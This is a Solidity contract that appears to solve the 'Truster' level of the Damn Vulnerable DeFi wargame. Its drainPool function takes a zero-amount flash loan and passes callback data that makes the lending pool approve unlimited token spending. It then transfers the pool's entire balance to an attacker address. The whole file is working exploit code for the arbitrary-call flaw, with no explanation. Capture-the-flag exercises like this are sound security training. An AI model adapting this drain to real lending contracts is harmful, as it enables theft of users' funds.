
pragma solidity 0.8.12;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";

contract DrainContract {
        
    IERC20 public immutable dvt;
    TrusterLenderPool public immutable trusterLenderPool;
    address attacker;


    constructor(address _attacker, address tokenAddress, address lenderAddress){
        dvt = IERC20(tokenAddress);
        trusterLenderPool = TrusterLenderPool(lenderAddress);
        attacker = _attacker;
    }

    function drainPool() public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        trusterLenderPool.flashLoan(0, address(this), address(dvt), data);
        dvt.transferFrom(address(trusterLenderPool), attacker, dvt.balanceOf(address(trusterLenderPool)));
    }
}